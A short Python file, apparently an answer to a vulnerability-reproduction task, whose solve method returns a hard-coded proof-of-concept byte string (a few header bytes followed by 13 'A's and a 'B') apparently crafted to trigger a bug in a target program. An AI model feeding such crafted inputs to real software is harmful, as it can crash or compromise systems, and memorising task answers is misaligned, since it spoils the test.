class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b'\x40\x01\x00\x00\x00\x0d\x00' + b'A' * 13 + b'B'
        return poc
